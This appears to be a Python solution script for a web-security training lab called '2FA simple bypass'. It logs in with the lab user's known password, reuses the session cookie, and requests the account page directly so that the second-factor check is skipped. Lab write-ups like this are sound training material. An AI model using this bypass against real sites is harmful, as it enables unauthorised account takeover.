#########################################################################
#
# Lab: 2FA simple bypass
#
# Hack Steps: 
#      1. Login as carlos
#      2. Get the session cookie
#      3. Fetch the profile page directly bypassing 2FA
#      4. Extract the name 'carlos' to make sure you logged in as him
#
#########################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a9500cd03ea932681b9e36000bf00ef.web-security-academy.net"

def main():
    print("⦗1⦘ Logging in as carlos.. ", end="", flush=True)

    data = { "username": "carlos", "password": "montoya" }
    login_as_carlos = post_data("/login", data)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Fetching the profile page directly bypassing 2FA.. ", end="", flush=True)
    
    session = login_as_carlos.cookies.get("session")
    cookies = { "session": session }
    carlos_profile = fetch("/my-account?id=carlos", cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Extracting the name 'carlos' to make sure you logged in as him.. ", end="", flush=True)
    
    pattern = re.findall("Your username is: carlos", carlos_profile.text)
    
    if len(pattern) != 0: 
        print(Fore.GREEN + "OK")
        print(Fore.WHITE + "🗹 Logged in successfully as carlos")
        print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
    else:    
        print(Fore.RED + "⦗!⦘ Failed to login as carlos")


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "\n⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "\n⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()